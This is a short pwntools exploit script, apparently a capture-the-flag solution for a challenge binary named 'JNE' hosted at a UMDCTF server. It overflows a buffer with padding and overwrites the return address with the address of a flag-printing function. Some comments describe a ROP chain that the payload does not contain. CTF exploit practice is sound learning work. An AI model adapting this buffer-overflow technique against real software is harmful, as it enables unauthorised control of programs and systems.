#!/usr/bin/python3
from pwn import *

def binary_connect(local, debug):
    if local:
        if debug:
            p = gdb.debug('./JNE', '''
                break *(jump + 12)
                continue
            ''')
        else:
            p = process('./JNE')

    else:
        # Create process from local 
        p = remote('chals5.umdctf.io',7004)

    return p

def main():
    local = False    
    debug = True

    p = binary_connect(local, debug)

    # recv initial prompt
    print(p.recvuntil('go?\n'))

    # flag address
    get_flag_addr = 0x00401261

    # send initial rop chain with length 0x1ffe (the 0x1fff char will be overwritten by fgets anyway)
    # store 0x00 in the first qword at name so that it can be used as a nullptr for rsi, rdx
    p.send(b'A' * 0x48 + p64(get_flag_addr) + b'\n')

if __name__ == "__main__":
    main()